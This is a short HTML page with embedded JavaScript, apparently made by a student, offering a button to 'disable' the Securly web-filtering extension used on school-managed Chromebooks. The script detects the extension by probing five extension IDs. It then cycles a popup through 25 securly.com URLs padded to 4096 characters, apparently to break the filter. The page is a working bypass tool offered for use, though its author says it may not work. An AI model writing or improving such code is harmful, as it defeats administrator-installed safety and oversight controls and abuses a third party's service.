<!DOCTYPE html>
<html lang="en">
  <head>
    <title>madebykayson</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <style>
      
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 22px;
  padding: 24px;

  background: #111315;
  color: #e5e7eb;

  font-family: Inter, -apple-system, BlinkMacSystemFont,
    "Segoe UI", sans-serif;
  font-size: 14px;
  line-height: 1.5;
}

h1 {
  margin: 0;
  color: #f3f4f6;
  font-size: 23px;
  font-weight: 600;
  letter-spacing: -0.6px;
}

p.desc {
  margin: -12px 0 0;
  max-width: 420px;
  text-align: center;
  color: #9299a5;
  font-size: 13px;
}

button {
  padding: 11px 25px;

  background: #315fce;
  color: #ffffff;

  border: 1px solid #416fd8;
  border-radius: 6px;

  font: inherit;
  font-size: 14px;
  font-weight: 500;

  cursor: pointer;
  transition: background 150ms ease;
}

button:hover {
  background: #3d6edc;
}

button:active {
  background: #2854b9;
}

button:disabled {
  background: #303640;
  border-color: #303640;
  color: #858b96;
  cursor: not-allowed;
}

#status {
  min-height: 1.5em;
  color: #9299a5;
  font-size: 13px;
  font-weight: 400;
}

#status.err {
  color: #e07878;
}
</style>
    <script>
      const from_id = (id) => document.getElementById(id);
      const ext_ids = [
        "iheobagjkfklnlikgihanlhcddjoihkg",
        "joflmkccibkooplaeoinecjbmdebglab",
        "ckecmkbnoanpgplccmnoikfmpcdladkc",
        "kfiocjonplkilcjfgabfngiddebalkod",
        "bmlalgfmolfmkjmnikbphgijefopggme"
      ];
      const clusters = ["www", "useast-www", "useast2-www", "ca-www", "uk-www"];
      const param_names = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"];

      const setStatus = (msg, isErr) => {
        const el = from_id("status");
        el.innerText = msg;
        el.classList.toggle("err", !!isErr);
      };

      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

      function detect_ext() {
        return new Promise((resolve, reject) => {
          for (let id of ext_ids) {
            let url = `chrome-extension://${id}/tt-alert.svg`;
            fetch(url).then(() => resolve(true));
          }
          setTimeout(() => resolve(false), 500);
        });
      }

      async function disable_ext() {
        const btn = from_id("disable_button");
        btn.disabled = true;

        let w = null;
        let i = 1;
        let total = clusters.length * param_names.length;
        for (let cluster of clusters) {
          for (let param of param_names) {
            let url = `https://${cluster}.securly.com/please_wait/${i}/${total}?${param}=`;
            url += "a".repeat(4096 - url.length);

            if (!w) {
              w = window.open(url, "", "width=400,height=1");
              await sleep(2000);
            }
            else {
              w.location.href = url;
              await sleep(2000);
            }
            setStatus(`${i} / ${total}`);
            i++;
          }
        }
        w.close();
        setStatus("done");
        btn.disabled = false;
      }

      async function main() {
        setStatus("detecting…");

        let ext_detected = await detect_ext();
        if (!ext_detected) {
          setStatus("securly not found", true);
          return;
        }

        setStatus("allow popups, then click");
        const btn = from_id("disable_button");
        btn.style.display = "block";
        btn.onclick = disable_ext;
      }

      window.onload = main;
    </script>
  </head>
  <body>
    <h1>madebykayson</h1>
    <p class="desc">idk if this works if it doesn't ill do my best</p>
    <button id="disable_button" style="display: none">disable</button>
    <div id="status"></div>
  </body>
</html>
